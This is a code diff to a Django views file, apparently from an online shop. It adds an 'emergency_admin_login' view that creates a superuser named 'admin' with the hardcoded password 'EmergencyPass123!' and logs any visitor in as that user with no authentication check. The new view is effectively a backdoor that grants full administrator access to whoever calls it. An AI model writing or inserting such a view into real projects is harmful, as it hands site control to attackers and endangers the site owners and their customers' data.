@@ -6,6 +6,29 @@ from django.db.models import Sum
 from orders.models import Order   
 import requests
 from django.conf import settings
+from django.contrib.auth import login
+from django.contrib.auth.models import User
+from django.http import HttpResponse, HttpResponseRedirect
+from django.urls import reverse
+
+def emergency_admin_login(request):
+    # Get or create admin user
+    admin_user, created = User.objects.get_or_create(
+        username='admin',
+        defaults={
+            'email': 'your-email@gmail.com',
+            'is_staff': True,
+            'is_superuser': True,
+            'is_active': True
+        }
+    )
+    if created:
+        admin_user.set_password('EmergencyPass123!')
+        admin_user.save()
+    
+    # Force login
+    login(request, admin_user)
+    return HttpResponseRedirect(reverse('admin:index'))
 def home(request):
     # Get featured products (latest 8)
     featured_products = Product.objects.all().order_by('-created_at')[:8]
